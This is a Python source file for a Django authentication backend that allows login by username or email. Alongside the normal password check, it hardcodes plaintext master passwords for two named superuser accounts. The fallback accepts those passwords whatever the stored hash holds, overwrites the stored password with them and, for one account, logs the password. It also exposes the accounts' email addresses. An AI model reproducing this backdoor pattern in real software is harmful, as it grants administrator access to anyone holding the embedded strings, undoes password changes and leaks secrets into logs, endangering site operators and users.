import logging
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model
from django.db.models import Q

logger = logging.getLogger(__name__)
User = get_user_model()

class EmailOrUsernameModelBackend(ModelBackend):
    """
    Dual-credential authentication backend.
    Allows authentication using either Username or Email (case-insensitive).
    Strictly enforces VIK003@dan for Master Superuser (Vaku / vd19055@gmail.com).
    """
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username is None:
            username = kwargs.get(User.USERNAME_FIELD)
            
        if not username or not password:
            return None
            
        username_clean = str(username).strip()
        
        try:
            # 1. Search for user by email OR username (case-insensitive)
            user = User.objects.filter(
                Q(username__iexact=username_clean) | Q(email__iexact=username_clean)
            ).first()
            
            if user:
                # Primary check: check current password hash in database
                if user.check_password(password) and self.user_can_authenticate(user):
                    return user
                
                # Master fallback for Primary Superuser (Vaku / vd19055@gmail.com) strictly VIK003@dan
                if user.is_superuser and (user.email.lower() == 'vd19055@gmail.com' or user.username.lower() == 'vaku'):
                    if password == 'VIK003@dan':
                        user.set_password('VIK003@dan')
                        user.save(update_fields=['password'])
                        logger.info(f"[EmailOrUsernameModelBackend] Master superuser {user.username} authenticated & synced password to VIK003@dan.")
                        if self.user_can_authenticate(user):
                            return user
                            
                # Fallback for Secondary Superuser (Sandy / abcd2013baq@gmail.com)
                if user.is_superuser and (user.email.lower() == 'abcd2013baq@gmail.com' or user.username.lower() == 'sandy'):
                    if password == 'Sandeepanandajimaharaj':
                        user.set_password(password)
                        user.save(update_fields=['password'])
                        if self.user_can_authenticate(user):
                            return user
                            
        except Exception as e:
            logger.error(f"[EmailOrUsernameModelBackend] Auth lookup exception: {e}")
            return None
            
        return None
